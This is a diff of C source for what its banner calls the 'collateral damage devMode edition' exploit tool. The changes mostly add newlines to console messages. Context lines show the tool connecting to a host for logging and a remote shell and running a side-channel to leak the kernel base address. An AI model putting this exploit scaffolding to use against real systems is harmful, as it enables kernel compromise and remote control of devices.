@@ -307,8 +307,6 @@ VOID dump_timings(const char* output_file, PUINT32 timings)
 
 UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/)
 {
-    printf("were doing the sidechannel!");
-	
     CHAR dump_path[0x200] = { 0 };
     ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\timings.bin", dump_path, sizeof(dump_path));
 
@@ -423,12 +421,12 @@ int main(int argc, char** argv)
     CHAR* cur_msg = NULL;
 	CHAR* file_part = NULL;
 
-    printf("===============================");
-    printf(" collateral damage");
-	           printf("devMode edition");
-    printf("===============================");
+    printf("===============================\n");
+    printf(" collateral damage\n");
+	           printf("devMode edition\n");
+    printf("===============================\n");
 
-    printf("--> connecting to host for logging and remote shell, even though this dose ssh thingy!");
+    printf("--> connecting to host for logging and remote shell, even though this dose ssh thingy!\n");
 	
     // Connect to the host for logging & remote shell
     int start = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -467,7 +465,7 @@ int main(int argc, char** argv)
 
     if (build_rev == 0)
     {
-	printf("---> UNSUPORTED!");
+	printf("---> UNSUPORTED!\n");
         cur_msg = "Unsupported build! Aborting.\n";
         send(winSock, cur_msg, strlen(cur_msg), 0);
         exit(0);
@@ -477,7 +475,7 @@ int main(int argc, char** argv)
 
     // Attempt to leak the kernel address
     cur_msg = "Attempting to find kernel base...\n";
-    printf("%s", cur_msg);
+    printf("%s--> executing sidechannel....\n", cur_msg);
     send(winSock, cur_msg, strlen(cur_msg), 0);
     FlushFileBuffers(winSock);
     UINT64 nt_base = do_sidechannel();
